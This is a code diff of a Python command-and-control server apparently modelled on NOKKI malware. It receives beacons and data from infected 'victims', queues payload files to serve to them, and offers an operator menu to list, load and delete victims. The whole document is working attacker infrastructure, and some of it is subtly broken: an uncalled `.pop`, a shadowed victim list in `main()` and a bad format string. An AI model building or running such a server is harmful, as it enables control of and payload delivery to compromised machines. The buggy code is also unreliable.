@@ -8,7 +8,8 @@ from base64 import b64decode, b64encode
 import threading
 import logging
 import os.path
-
+import json
+import pickle
 
 victim_list = {}
 
@@ -20,15 +21,22 @@ class NOKKIvictim:
     # time
     # date
     # data
+    # files queued
+    # count of posts and gets
+
+    # generic filename
+
 
     count_post = 0
     count_get = 0
 
     generic_filename = ''
-    victim_filename = []
+    victim_filenames = []
 
     def __init__(self, content_body):
         # does the parsing and variable assignment
+        logging.info('content_body: %s' % content_body)
+
         type_flag = 0  # flag used if req_type tag exists, adds one to make room for req_type
 
         # parse the data from the content body
@@ -44,18 +52,11 @@ class NOKKIvictim:
 
         self.req_count = 0
 
-    def __init__(self, subject, time, date, data, type_):
-        self.type = type_
-        self.subject = subject
-        self.time = time
-        self.date = date
-        self.data = data
-
     def inc_post_count(self):
-        self.req_count += 1
+        self.count_post += 1
 
     def inc_get_count(self):
-        self.req_count += 1
+        self.count_get += 1
 
     @staticmethod
     def set_generic_filename(filename):
@@ -67,7 +68,7 @@ class NOKKIvictim:
     def add_victim_filename(self, filename):
         # allows for queuing of files
         if os.path.exists(filename):
-            self.victim_filename.append(filename)
+            self.victim_filenames.append(filename)
             return filename
         else:
             return ''
@@ -77,7 +78,7 @@ class NOKKIvictim:
         return NOKKIvictim.generic_filename
 
     def ret_victim_filename(self):
-        return self.victim_filename
+        return self.victim_filenames
 
     @staticmethod
     def ret_generic_file_data():
@@ -93,15 +94,18 @@ class NOKKIvictim:
 
     def ret_victim_file_data(self):  # pops off one filename from the array each call, returns data
         vic_data = b''
-        vic_filename = self.victim_filename.pop
-        try:
-            with open(vic_filename, 'rb') as vic_file:
-                vic_data = vic_file.read()
-        except Exception():  # TODO: specify exception
-            logging.error('Failed to return generic file data!')
-            return b''
+        if len(self.victim_filenames):
+            vic_filename = self.victim_filenames.pop
+            try:
+                with open(vic_filename, 'rb') as vic_file:
+                    vic_data = vic_file.read()
+            except Exception:  # TODO: specify exception
+                logging.error('Failed to return generic file data!')
+                return b''
+            else:
+                return vic_data
         else:
-            return vic_data
+            return b''
 
 
 class RequestHandler(http.server.SimpleHTTPRequestHandler):
@@ -132,8 +136,8 @@ class RequestHandler(http.server.SimpleHTTPRequestHandler):
             if victim:
                 victim.inc_get_count()
                 try:
-                    # retrieves payload for specific victim request
-                    logging.info('Specific download request from victim ID:', victim_id)
+                    # retrieves payload for specific victim request if it exists
+                    logging.info('Specific download request from victim ID: %s' % victim_id)
                     response_data = victim_list[victim_id].ret_victim_file_data()
                 except KeyError as e:
                     print('An error has been logged: failed to retrieve victim information.')
@@ -143,7 +147,8 @@ class RequestHandler(http.server.SimpleHTTPRequestHandler):
                 response_data = b''
                 logging.info('Beaconing victim does not exist: requiring POST request first.')
         else:
-            raise Exception()  # TODO: better handle this exception; change to return nothing after some more RE
+            logging.critical('Unrecognized request!')
+            raise Exception  # TODO: better handle this exception; change to return nothing after some more RE
 
         self.send_response(200)
         self.send_header("Content-type", "text/html")
@@ -194,22 +199,14 @@ def main_menu():
     menu_active = True
     menu_option = 0
 
-    # DEBUG: testing data
-    vic = NOKKIvictim('AAAAABBBBB', '11:08', '6/5/2020', 'asdfasfdasdfasdfasf', '[null]')
-    victim_list[vic.subject] = vic
-    vic = NOKKIvictim('WERWERWERR', '12:18', '6/4/2020', 'yuityuityuityuityui', '[null]')
-    victim_list[vic.subject] = vic
-    vic = NOKKIvictim('CVBNCVBNCV', '16:23', '6/9/2020', 'fghjhkbnmvmvbhjvjvj', '[null]')
-    victim_list[vic.subject] = vic
-
     while menu_active:
-        print('============== MAIN MENU ==============')
-        print('| (0)        List Victims             |')
-        print('| (1)    Add Specific Payload         |')
-        print('| (2)    Set Generic Payload          |')
-        print('| (3)       Delete Victims            |')
-        print('| (4)            Exit                 |')
-        print('=======================================')
+        print('===================== MAIN MENU =====================')
+        print('|    (0)            List Victims                    |')
+        print('|    (1)        Add Specific Payload                |')
+        print('|    (2)         Set Generic Payload                |')
+        print('|    (3)            Delete Victims                  |')
+        print('|    (4)                 Exit                       |')
+        print('=====================================================')
 
         try:
             menu_option = int(input('?> '))
@@ -218,41 +215,51 @@ def main_menu():
 
         if menu_option == 0:
             # LIST VICTIMS
-            print('------------- VICTIM LIST -------------')
+            print('-------------------- VICTIM LIST --------------------')
+            print("Generic Filename: %s" % NOKKIvictim.generic_filename)
+            print("[SubjectID] [TYPE] ([TIME DATE]) [POST|GET] [DATA]")
             for key in victim_list:
-                print(victim_list[key].subject + " : " + victim_list[key].data)
+                print("%s %s (%s %s) %d|%d" % (
+                    key,
+                    victim_list[key].type,
+                    victim_list[key].time,
+                    victim_list[key].date,
+                    victim_list[key].count_post,
+                    victim_list[key].count_get
+                ))
+
+                print(victim_list[key].data)
         elif menu_option == 1:
             # ADD SPECIFIC PAYLOAD
-            print('--------- ADD VICTIM PAYLOAD ----------')
-            for key in victim_list:
-                print(key + ') ' + victim_list[key].subject + ' : ' + victim_list[key].data)
-
+            print('---------------- ADD VICTIM PAYLOAD -----------------')
             while True:
-                victim_key = input('Specify the victim for the specific file download: ')
+                victim_key = input('Victim for specific file upload: ')
                 if victim_key in victim_list:
                     print('Selected %s.' % victim_key)
-                    break
-                else:
-                    print('That victim key does not exist.')
-
-            while True:
-                specific_filename = input('Provide a filename for the %s file download: ' % victim_key)
-                if os.path.isfile(specific_filename):
-                    if victim_list[victim_key].add_victim_filename(specific_filename):  # sets generic upload filename
-                        break
-                    else:
-                        print('Failed to set specific upload filename! Try again.')
-                elif specific_filename == 'no':
+                    while True:
+                        specific_filename = input('Filename for victim %s file download: ' % victim_key)
+                        if os.path.isfile(specific_filename):
+                            if victim_list[victim_key].add_victim_filename(
+                                    specific_filename):  # sets generic upload filename
+                                break
+                            else:
+                                print('Failed to set specific upload filename! Try again.')
+                        elif specific_filename == 'no':
+                            print('Canceled adding victim payload.')
+                            break
+                        else:
+                            print("Try another filename or type 'no' to cancel.")
+                elif victim_key == 'no':
                     print('Canceling!')
                     break
                 else:
-                    print("Try another filename or type 'no' to cancel.")
+                    print("Try another victim subject or type 'no' to cancel.")
 
         elif menu_option == 2:
             # SET GENERIC PAYLOAD
-            print('--------- SET DEFAULT PAYLOAD ---------')
+            print('---------------- SET DEFAULT PAYLOAD ----------------')
             while True:
-                generic_filename = input('Provide a filename for the generic file download: ')
+                generic_filename = input('Filename for the generic file download: ')
                 if os.path.isfile(generic_filename):
                     if NOKKIvictim.set_generic_filename(generic_filename):  # sets generic upload filename
                         break
@@ -264,31 +271,39 @@ def main_menu():
                 else:
                     print("Try another filename or type 'no' to cancel.")
         elif menu_option == 3:
-            print('----------- DELETE A VICTIM -----------')
+            print('------------------ DELETE A VICTIM ------------------')
             # DELETE VICTIMS
-            for key in victim_list:
-                print(key + ') ' + victim_list[key].subject + ' : ' + victim_list[key].data)
-
             while True:
-                victim_key = input('Specify the victim ID for deletion: ')
+                victim_key = input('Specify the victim subject ID for deletion: ')
                 if victim_key in victim_list:
-                    print('Removing %s...' % victim_key)
                     victim_removed = victim_list.pop(victim_key)
                     print('Removed %s.' % victim_removed.subject)
                     break
+                elif victim_key == 'no':
+                    print('Canceling!')
+                    break
                 else:
-                    print('That victim key does not exist.')
+                    print("Try another victim subject or type 'no' to cancel." % victim_key)
         elif menu_option == 4:
             # EXIT
             print('Exiting!')
+            with open('victim_data', 'wb') as f:
+                pickle.dump(victim_list, f, pickle.HIGHEST_PROTOCOL)
             menu_active = False
         else:
-            print('Please provide another menu input.')
+            print('Provide another menu input.')
 
 
 def main():
     # start logging to file, allows users to tail log
     logging.basicConfig(filename='nokki.log', level=logging.INFO)
+
+    # load JSON data for victim list
+    try:
+        with open('victim_data', 'rb') as f:
+            victim_list = pickle.load(f)
+    except FileNotFoundError:
+        logging.error("No 'victim_data' file found.")
 
     # start request handler thread, allows for both user and victim interface
     x = threading.Thread(target=start_request_handler, args=())
